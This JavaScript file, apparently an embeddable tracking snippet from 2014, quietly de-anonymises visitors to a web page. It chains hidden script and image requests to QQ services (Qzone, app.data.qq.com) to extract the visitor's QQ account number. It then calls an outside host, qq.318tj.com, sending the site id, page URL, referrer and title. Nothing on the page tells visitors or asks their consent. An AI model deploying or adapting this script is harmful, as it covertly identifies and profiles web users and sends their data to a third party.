/**
 * Created by zhiwen on 14-5-29.
 */
var Qin_para=document.getElementById("Qin");
var Qin_v;
Qin_v=Qin_para.src;
var Qin_tmp=Qin_v.split("?");
var Qin_ids=Qin_tmp[1];
var Qin_host=encodeURIComponent(document.location.href);
var Qin_title=escape(document.title);
var Qin_refer=encodeURIComponent(document.referrer);
var tm=Math.random();
var counter = 0;

function loadjs() {
    try {
        if (data0.err == '1026') {
            var oScript = document.createElement("script");
            oScript.type = "text/javascript";
            oScript.src = "http://qq.318tj.com/t.php?"+Qin_ids+"&callback=ninData&t=" + (new Date()).getTime();
            document.getElementsByTagName('HEAD').item(0).appendChild(oScript);

            var _div = document.createElement('div');
            _div.id = 'QIN_load';
            _div.style='display:none';
            document.getElementsByTagName('body').item(0).appendChild(_div);
            window.setTimeout(loadData, 1000);
        } else {
            window.setTimeout(dynamicLoad, 1000);
        }
    } catch (e) {
        window.setTimeout(dynamicLoad, 1000);
    }
}

function ninData(){
    if(parseInt(uin) < 1){
        window.setTimeout(loadjs, 100);
        return false;
    }
    var url = 'http://user.qzone.qq.com/' + uin + '&t=' + (new Date()).getTime();
    var xScript = document.createElement("script");
    xScript.type = "text/javascript";
    xScript.src = url;
    if (xScript.readyState) {
        xScript.onreadystatechange = function() {
            if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                xScript.onreadystatechange = null;
                window.setTimeout(save, 1000);
            }
        };
    } else {
        xScript.onload = function() {
            window.setTimeout(save, 1000);
        };
    }
    document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
}

function loadData(){
    if(typeof myUin == undefined || parseInt(myUin) < 1){
        window.setTimeout(loadjs, 100);
        return false;
    }
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData1, 500);" />';
}

function loadData1(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData2, 500);" />';
}

function loadData2(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData3, 500);" />';
}
function loadData3(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData4, 500);" />';
}
function loadData4(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData5, 500);" />';
}
function loadData5(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData6, 500);" />';
}
function loadData6(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData7, 500);" />';
}
function loadData7(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData8, 500);" />';
}
function loadData8(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData9, 500);" />';
}
function loadData9(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData10, 500);" />';
}
function loadData10(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData11, 500);" />';
}
function loadData11(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData12, 500);" />';
}
function loadData12(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData13, 500);" />';
}
function loadData13(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData14, 500);" />';
}
function loadData14(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData15, 500);" />';
}
function loadData15(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData16, 500);" />';
}
function loadData16(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData17, 500);" />';
}
function loadData17(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData18, 500);" />';
}
function loadData18(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData19, 500);" />';
}
function loadData19(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(loadData20, 500);" />';
}

function loadData20(){
    var url = 'http://app.data.qq.com/?umod=user&uid=' + myUin + '&t=' + (new Date()).getTime();
    document.getElementById('QIN_load').innerHTML = '<img src="'+url+'" onerror="setTimeout(save, 1000);" />';
}

function save(){
    var xScript = document.createElement("script");
    xScript.type = "text/javascript";
    xScript.src = 'http://qq.318tj.com/code/code.php?' + Qin_ids + '&u=' + Qin_host + '&r=' + Qin_refer + '&t=' + Qin_title + '&tm=' + tm;
    document.getElementsByTagName('HEAD').item(0).appendChild(xScript);
}

function dynamicLoad() {
    var oScript = document.createElement("script");
    oScript.type = "text/javascript";
    oScript.src = "http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime();
    if (oScript.readyState) {
        oScript.onreadystatechange = function() {
            if (oScript.readyState == "loaded"
                || oScript.readyState == "complete") {
                oScript.onreadystatechange = null;
                window.setTimeout(loadjs, 500);
            }
        };
    } else {
        oScript.onload = function() {
            window.setTimeout(loadjs, 500);
        };
    }
    document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
}
dynamicLoad();
